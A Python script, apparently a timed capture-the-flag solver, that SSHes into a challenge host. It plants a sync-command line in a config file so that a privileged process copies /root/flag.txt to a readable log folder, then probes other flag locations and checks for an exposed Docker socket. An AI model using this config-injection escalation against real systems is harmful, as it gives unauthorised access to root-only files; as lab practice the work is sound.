#!/usr/bin/env python3
import subprocess
import time

# Final attempt - less than 5 minutes remaining

cmd = """
echo '[FINAL ATTEMPT - All vectors]'

# 1. Set sync command to copy flag to accessible location
echo 'talldwarf-sync-command=cp /root/flag.txt /opt/mc/logs/flag.txt 2>&1' > /opt/mc/config/sync-request.conf
sleep 7

# 2. Check if flag appeared
cat /opt/mc/logs/flag.txt 2>/dev/null && echo '[SUCCESS]' || echo '[No flag in logs]'

# 3. Try reading .sync directory (might be readable after sync)
cat /opt/mc/.sync/flag.txt 2>/dev/null || echo '[No flag in .sync]'

# 4. Check if sync exposed it via HTTP
python3 -c "import urllib.request; print(urllib.request.urlopen('http://172.27.0.1/flag.txt', timeout=2).read().decode())" 2>/dev/null || echo '[No HTTP flag]'

# 5. Last resort - check if Docker socket is accessible
ls -la /var/run/docker.sock 2>/dev/null

echo '[END]'
"""

result = subprocess.run(
    f'ssh -o StrictHostKeyChecking=no player@instance.ctf.tdho.st -p 32967 "{cmd}"',
    shell=True,
    capture_output=True,
    text=True,
    timeout=25
)

print(result.stdout)
if result.stderr:
    print("STDERR:", result.stderr)
